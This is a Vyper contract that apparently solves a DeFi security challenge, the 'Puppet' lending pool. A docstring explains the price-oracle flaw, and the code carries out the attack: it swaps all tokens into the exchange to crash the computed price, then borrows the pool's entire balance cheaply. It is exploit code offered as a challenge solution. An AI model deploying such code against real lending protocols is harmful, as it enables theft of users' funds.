# @version ^0.3.7

"""
The vulnerability is in the `_computeOraclePrice()` function
of the PuppetPool contract. It uses the pair's ETH balance 
and token balance to calculate the price. Therefore if someone
can manipulate the price by altering those balances they can manipulate
the price and potentially borrow more tokens than the protocol anticipated. 
An attacker can make the token balance of the pair increase drastically 
and that would result in a drastic decrease in the computed price. An 
attacker can swap all of their tokens through the exchange for nearly no ETH 
(the goal is to make the denominator in the `_computeOraclePrice()`
function large, making the computed price smaller). They can then 
borrow all of the tokens in the pool for a huge discount, since the 
required ETH is much less now that the price has been manipulated.
"""

from vyper.interfaces import ERC20 as IERC20

interface IExchange:
    def tokenToEthSwapInput(
       amountIn: uint256,
       amountOut: uint256,
       deadline: uint256,
    ): nonpayable

interface IPool:
   def calculateDepositRequired(
        amount: uint256,
   ) -> uint256: view
   def borrow(amount: uint256, recipient: address): payable

@external
@payable
def __init__(token: IERC20, exchange: IExchange, pool: IPool, deadline: uint256, v: uint8, r: bytes32, s: bytes32):
    assert msg.value > as_wei_value(24, "ether"), "send > 24 ETH"

    raw_call(
        token.address,
        _abi_encode(
            msg.sender,
            self,
            token.balanceOf(msg.sender),
            deadline,
            v,
            r,
            s,
            method_id=method_id(
                "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)"
            )
        ),
    )
    token.transferFrom(msg.sender, self, token.balanceOf(msg.sender))


    initial_balance: uint256 = token.balanceOf(self)
    pool_balance: uint256 = token.balanceOf(pool.address)

    token.approve(exchange.address, initial_balance)
    exchange.tokenToEthSwapInput(initial_balance, 1, deadline)
    eth_required: uint256 = pool.calculateDepositRequired(pool_balance) 
    pool.borrow(pool_balance, msg.sender, value=eth_required) 

    send(msg.sender, self.balance)
